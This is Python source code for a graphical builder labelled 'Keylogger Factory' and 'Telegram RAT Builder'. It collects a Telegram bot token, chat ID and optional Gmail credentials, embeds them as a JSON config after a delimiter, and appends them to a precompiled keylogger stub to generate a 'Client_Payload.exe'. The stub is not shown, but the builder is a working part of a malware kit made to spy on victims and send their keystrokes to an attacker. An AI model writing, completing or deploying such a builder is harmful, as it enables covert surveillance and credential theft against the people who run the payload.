import tkinter as tk
from tkinter import messagebox, filedialog
import os
import sys
import shutil
import threading
import json
import time

# Helper for PyInstaller bundled paths
def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIxxxxxx
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

# Stub is expected to be in the same folder during Dev, or bundled in distribution
STUB_NAME = "Stub.exe"
STUB_PATH = resource_path(os.path.join("dist", STUB_NAME)) if os.path.exists(os.path.join("dist", STUB_NAME)) else resource_path(STUB_NAME)
OUTPUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Generated_Payloads")

CONFIG_DELIMITER = b"#####CONFIG#####"

class ConfigBuilder:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Keylogger Factory (Standalone) 🏭")
        self.root.geometry("600x650")
        self.root.resizable(False, False)
        
        # Header
        header = tk.Label(self.root, text="🕵️ Telegram RAT Builder", font=("Segoe UI", 18, "bold"))
        header.pack(pady=10)
        
        # --- Form Frame ---
        form_frame = tk.Frame(self.root)
        form_frame.pack(pady=5, padx=20, fill="x")

        # 1. Bot Token
        tk.Label(form_frame, text="Bot Token (Required):", font=("Segoe UI", 10, "bold")).grid(row=0, column=0, sticky="w", pady=5)
        self.token_entry = tk.Entry(form_frame, width=40, font=("Consolas", 10))
        self.token_entry.grid(row=0, column=1, pady=5, padx=5)

        # 2. Chat ID
        tk.Label(form_frame, text="Chat ID (Optional):", font=("Segoe UI", 10)).grid(row=1, column=0, sticky="w", pady=5)
        self.chat_id_entry = tk.Entry(form_frame, width=40, font=("Consolas", 10))
        self.chat_id_entry.grid(row=1, column=1, pady=5, padx=5)
        
        # 3. Output Filename
        tk.Label(form_frame, text="Output Filename (.exe):", font=("Segoe UI", 10, "bold")).grid(row=2, column=0, sticky="w", pady=5)
        self.filename_entry = tk.Entry(form_frame, width=40, font=("Consolas", 10))
        self.filename_entry.insert(0, "Client_Payload.exe")
        self.filename_entry.grid(row=2, column=1, pady=5, padx=5)
        
        # --- Email Section ---
        email_frame = tk.LabelFrame(self.root, text="📧 Email Configuration (Optional)", font=("Segoe UI", 10, "bold"), fg="#007BFF")
        email_frame.pack(pady=10, padx=20, fill="x")

        # Enable Checkbox
        self.email_vars_visible = tk.BooleanVar(value=False)
        self.email_check = tk.Checkbutton(email_frame, text="Enable Email Reporting", variable=self.email_vars_visible, command=self.toggle_email_fields, font=("Segoe UI", 9))
        self.email_check.pack(anchor="w", padx=10, pady=2)

        # Fields container
        self.email_fields_frame = tk.Frame(email_frame)
        self.email_fields_frame.pack(fill="x", padx=10, pady=5)

        tk.Label(self.email_fields_frame, text="Gmail Address:", font=("Segoe UI", 9)).grid(row=0, column=0, sticky="w")
        self.email_user_entry = tk.Entry(self.email_fields_frame, width=35, font=("Consolas", 9))
        self.email_user_entry.grid(row=0, column=1, padx=5, pady=2)

        tk.Label(self.email_fields_frame, text="App Password:", font=("Segoe UI", 9)).grid(row=1, column=0, sticky="w")
        self.email_pass_entry = tk.Entry(self.email_fields_frame, width=35, font=("Consolas", 9), show="*")
        self.email_pass_entry.grid(row=1, column=1, padx=5, pady=2)

        tk.Label(self.email_fields_frame, text="Receiver Email:", font=("Segoe UI", 9)).grid(row=2, column=0, sticky="w")
        self.email_to_entry = tk.Entry(self.email_fields_frame, width=35, font=("Consolas", 9))
        self.email_to_entry.grid(row=2, column=1, padx=5, pady=2)

        self.toggle_email_fields() # Initial State

        # --- Build Button ---
        self.build_btn = tk.Button(self.root, text="🔨 GENERATE PAYLOAD", command=self.start_build, 
                                   bg="#007BFF", fg="white", font=("Segoe UI", 12, "bold"), height=2, width=35)
        self.build_btn.pack(pady=15)
        
        # --- Status Area ---
        self.status_label = tk.Label(self.root, text="Ready to build.", fg="gray", font=("Segoe UI", 9))
        self.status_label.pack(side=tk.BOTTOM, pady=5)

        # Create Output Dir
        if not os.path.exists(OUTPUT_DIR):
            os.makedirs(OUTPUT_DIR)

    def toggle_email_fields(self):
        state = "normal" if self.email_vars_visible.get() else "disabled"
        self.email_user_entry.config(state=state)
        self.email_pass_entry.config(state=state)
        self.email_to_entry.config(state=state)

    def start_build(self):
        # 1. Validate Inputs
        token = self.token_entry.get().strip()
        filename = self.filename_entry.get().strip()
        
        if not token:
            messagebox.showerror("Error", "Bot Token is required!")
            return
        if not filename.endswith(".exe"):
            filename += ".exe"
            
        # Email Info
        email_data = {}
        if self.email_vars_visible.get():
            email_data["email_enabled"] = True
            email_data["email_user"] = self.email_user_entry.get().strip()
            email_data["email_pass"] = self.email_pass_entry.get().strip()
            email_data["email_to"] = self.email_to_entry.get().strip()
            if not all([email_data["email_user"], email_data["email_pass"], email_data["email_to"]]):
                messagebox.showerror("Error", "All Email fields are required if Email Reporting is enabled.")
                return
        else:
            email_data["email_enabled"] = False

        # 2. Check Stub
        # Just in case we are running dev mode and stub is in dist/
        stub_check = STUB_PATH
        if not os.path.exists(stub_check):
            # Try looking in dist folder relative to script
            stub_check = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dist", STUB_NAME)
        
        if not os.path.exists(stub_check):
             messagebox.showerror("Error", f"Stub.exe not found!\nMake sure you have compiled the stub first.\nMissing: {stub_check}")
             return

        # 3. UI Update
        self.build_btn.config(state=tk.DISABLED, text="Building... Please Wait ⏳", bg="#6c757d")
        self.status_label.config(text="Processing...", fg="blue")
        
        # 4. Start Thread
        chat_id = self.chat_id_entry.get().strip()
        threading.Thread(target=self.run_build_process, args=(token, chat_id, filename, email_data, stub_check), daemon=True).start()

    def run_build_process(self, token, chat_id, filename, email_data, stub_path):
        try:
            # A. Prepare Config Data
            config_data = {
                "bot_token": token,
                "chat_id": chat_id,
                **email_data
            }
            
            json_str = json.dumps(config_data)
            payload_bytes = CONFIG_DELIMITER + json_str.encode('utf-8')
            
            # B. Read Stub Bytes
            with open(stub_path, "rb") as f:
                stub_content = f.read()
                
            # C. Combine Stub + Config
            final_content = stub_content + payload_bytes
            
            # D. Write Output
            target_path = os.path.join(OUTPUT_DIR, filename)
            with open(target_path, "wb") as f:
                f.write(final_content)
                
            self.root.after(0, lambda: self.success_build(target_path))

        except Exception as e:
            self.fail_build(f"Critical Error: {e}")

    def success_build(self, exe_path):
        self.status_label.config(text="✅ Build Completed Successfully!", fg="green")
        self.build_btn.config(state=tk.NORMAL, text="🔨 GENERATE PAYLOAD", bg="#007BFF")
        
        response = messagebox.askyesno("Success", f"Payload Generated!\n\nLocation: {exe_path}\n\nOpen output folder?")
        if response:
            os.startfile(os.path.dirname(exe_path))

    def fail_build(self, error_msg):
        self.root.after(0, lambda: self._handle_fail(error_msg))

    def _handle_fail(self, error_msg):
        self.status_label.config(text="❌ Build Failed", fg="red")
        self.build_btn.config(state=tk.NORMAL, text="🔨 GENERATE PAYLOAD", bg="#007BFF")
        messagebox.showerror("Error", error_msg)

if __name__ == "__main__":
    app = ConfigBuilder()
    app.root.mainloop()
